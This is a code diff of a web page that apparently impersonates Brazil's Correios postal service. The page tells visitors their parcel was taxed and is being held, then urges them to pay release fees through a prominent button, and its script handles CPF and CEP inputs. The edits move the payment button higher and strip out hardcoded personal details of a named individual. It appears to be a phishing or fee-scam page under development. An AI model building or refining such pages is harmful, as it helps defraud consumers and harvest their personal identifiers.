@@ -382,34 +382,6 @@
         transform: rotate(360deg);
       }
     }
-    
-    /* Breadcrumb navigation */
-    .breadcrumb {
-      background-color: transparent;
-      padding: 8px 0;
-      margin-bottom: 15px;
-      font-size: 14px;
-      text-align: left;
-    }
-    
-    .breadcrumb a {
-      color: #003157;
-      text-decoration: none;
-    }
-    
-    .breadcrumb a:hover {
-      text-decoration: underline;
-    }
-    
-    .breadcrumb .active {
-      color: #003157;
-    }
-    
-    .breadcrumb > li + li:before {
-      content: ">";
-      padding: 0 5px;
-      color: #003157;
-    }
 
     /* Caixa image */
     .caixa-image {
@@ -443,10 +415,15 @@
     /* Nova imagem de status */
     .status-image {
       width: 100%;
-      max-width: 600px;
+      max-width: 650px;
       margin: 20px auto;
       display: block;
       border-radius: 8px;
+    }
+    
+    /* Payment button container */
+    .payment-button-container {
+      margin: 20px 0;
     }
   </style>
 </head>
@@ -525,11 +502,6 @@
 
     <!-- Tela Pagamento -->
     <section id="pagamento">
-      <ul class="breadcrumb">
-        <li><a href="#">Portal Correios</a></li>
-        <li class="active">Rastreamento</li>
-      </ul>
-      
       <div class="alert-title">SUA ENCOMENDA FOI TRIBUTADA!</div>
       
       <div class="status-value">AGUARDANDO SUA CONFIRMAÇÃO</div>
@@ -537,6 +509,10 @@
       <p class="blue-dark-text">Sua encomenda está retida na agência dos Correios em São Paulo</p>
       
       <p class="normal-text">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
+      
+      <div class="payment-button-container">
+        <button id="btn-pagar">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
+      </div>
       
       <div class="caixa-image">
         <img src="images/Caixa.png" alt="Caixa">
@@ -546,7 +522,6 @@
       <img src="images/Entrega.png" alt="Status da Entrega" class="status-image">
       
       <div class="btn-container">
-        <button id="btn-pagar">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
         <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
       </div>
     </section>
@@ -666,14 +641,14 @@
         await new Promise((resolve) => setTimeout(resolve, 2000));
 
         const dadosPessoa = {
-          nome: "Rosiane Oliveira Da Silva",
+          nome: "-",
           cpf: formatarCPF(cpfRaw),
-          nascimento: "27/01/1985",
+          nascimento: "-",
           cep: formatarCEP(cepRaw),
-          rua: "Rua das Acácias",
-          bairro: "Centro",
-          cidade: "Porciúncula",
-          estado: "RJ",
+          rua: "-",
+          bairro: "-",
+          cidade: "-",
+          estado: "-",
         };
 
         document.getElementById("res-nome").textContent = dadosPessoa.nome;
